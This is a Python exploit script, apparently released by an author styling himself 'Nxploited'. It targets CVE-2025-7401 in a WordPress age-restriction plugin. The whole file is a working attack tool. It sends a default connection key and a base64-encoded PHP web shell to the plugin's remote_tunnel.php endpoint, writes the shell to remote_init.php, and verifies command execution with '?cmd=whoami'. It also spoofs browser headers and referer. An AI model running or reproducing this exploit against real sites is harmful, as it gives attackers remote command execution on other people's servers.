# -*- coding: utf-8 -*-
__author__ = "Nxploited (khaled Alenazi)"
import argparse
import base64
import json
import posixpath
import random
import re
import sys
import time
from urllib.parse import urlparse, urlunparse

import requests

def Nxploited_clean_url(url):
    url = url.strip()
    if not re.match(r'^https?://', url):
        url = 'http://' + url.lstrip('/')
    parsed = urlparse(url)
    endpoint = '/wp-content/plugins/age-restriction/modules/remote_support/remote_tunnel.php'
    path = parsed.path.rstrip('/')
    if 'remote_tunnel.php' not in path:
        if path == '' or path == '/':
            path = endpoint
        else:
            if path.endswith('/remote_support') or path.endswith('remote_support'):
                path = path.rstrip('/') + '/remote_tunnel.php'
            elif 'wp-content' in path and 'remote_support' in path and not path.endswith('remote_tunnel.php'):
                path = path.rstrip('/') + '/remote_tunnel.php'
            else:
                path = path.rstrip('/') + endpoint
    path = posixpath.normpath(path)
    if not path.startswith('/'):
        path = '/' + path
    cleaned = urlunparse((parsed.scheme, parsed.netloc, path, '', '', ''))
    cleaned = re.sub(r'(?<!:)//+', '/', cleaned)
    return cleaned

def Nxploited_build_headers():
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
    ]
    headers = {
        "User-Agent": random.choice(uas) + " Nxploited/1.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "no-cache",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://www.google.com/"
    }
    return headers

def Nxploited_shell_encode(shell_code):
    return base64.b64encode(shell_code.encode()).decode()

def Nxploited_post_exploit(endpoint_url, connection_key, shell_code, timeout=12):
    server_path = '/var/www/html/wp-content/plugins/age-restriction/modules/remote_support/remote_init.php'
    post_data = {
        "connection_key": connection_key,
        "action": "save_file",
        "file": server_path,
        "file_content": Nxploited_shell_encode(shell_code)
    }
    try:
        resp = requests.post(endpoint_url, data=post_data, headers=Nxploited_build_headers(), timeout=timeout, allow_redirects=False)
        return resp
    except Exception as e:
        return e

def Nxploited_verify_shell(base_url, timeout=8):
    shell_web = '/wp-content/plugins/age-restriction/modules/remote_support/remote_init.php'
    parsed = urlparse(base_url)
    base = urlunparse((parsed.scheme, parsed.netloc, '', '', '', ''))
    shell_url = base.rstrip('/') + shell_web
    try:
        resp = requests.get(shell_url + '?cmd=whoami', headers=Nxploited_build_headers(), timeout=timeout, allow_redirects=True)
        return shell_url, resp
    except Exception as e:
        return shell_url, e

def Nxploited_banner():
    now = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
    banner = [
        "===============================================",
        " WP Shell Injector - by Nxploited)khaled Alenazi) ",
        f"       : {now}",
        "===============================================",
    ]
    print("\n".join(banner))

def Nxploited():
    parser = argparse.ArgumentParser(description="CVE-2025-7401 | Nxploited WP Shell Injector")
    parser.add_argument('-u', '--url', type=str, required=True, help='Target domain or partial URL')
    parser.add_argument('-key', '--key', type=str, default='330489965d8266a739442ef890f57805', help='Connection key')
    parser.add_argument('-shell', '--shell', type=str, default='<?= system($_GET[\"cmd\"]); ?>', help='PHP shell code to inject')
    parser.add_argument('--no-verify', action='store_true', help='Do not attempt to verify shell after upload')
    args = parser.parse_args()

    Nxploited_banner()
    cleaned = Nxploited_clean_url(args.url)
    print("Target endpoint: ", cleaned)
    print("Using connection_key:", args.key)
    print("Shell (preview):", args.shell)
    print("Encoding shell to base64...")

    resp = Nxploited_post_exploit(cleaned, args.key, args.shell)
    if isinstance(resp, Exception):
        print("Error sending exploit request:", resp)
        sys.exit(1)

    print("HTTP Status Code:", resp.status_code)
    text = resp.text if resp.text else ""
    json_match = re.search(r'\{.*\}', text, flags=re.S)
    if json_match:
        try:
            parsed = json.loads(json_match.group(0))
            print("Response JSON status:", parsed.get('status'))
            print("Response JSON file_path:", parsed.get('file_path'))
        except Exception:
            print("Raw response:", text.strip())
    else:
        trimmed = re.sub(r'<br\s*/?>', '\n', text, flags=re.I)
        trimmed = re.sub(r'(?m)^\s+|\s+$', '', trimmed)
        if trimmed:
            print("Raw response:", trimmed)
        else:
            print("No response body or empty response.")

    parsed_url = urlparse(cleaned)
    base = urlunparse((parsed_url.scheme, parsed_url.netloc, '', '', '', ''))
    shell_web = base.rstrip('/') + '/wp-content/plugins/age-restriction/modules/remote_support/remote_init.php'
    print("\nShell URL (expected):", shell_web)
    if not args.no_verify:
        print("Verifying shell availability...")
        shell_url, vresp = Nxploited_verify_shell(cleaned)
        if isinstance(vresp, Exception):
            print("Verification error:", vresp)
            print("You can manually check:", shell_url + "?cmd=whoami")
        else:
            print("Verification HTTP Status:", vresp.status_code)
            body = vresp.text.strip() if vresp.text else ""
            if body:
                print("Verification response (truncated):")
                print(body[:1000])
            else:
                print("Verification returned empty body. Try accessing the shell URL manually.")

if __name__ == "__main__":
    Nxploited()
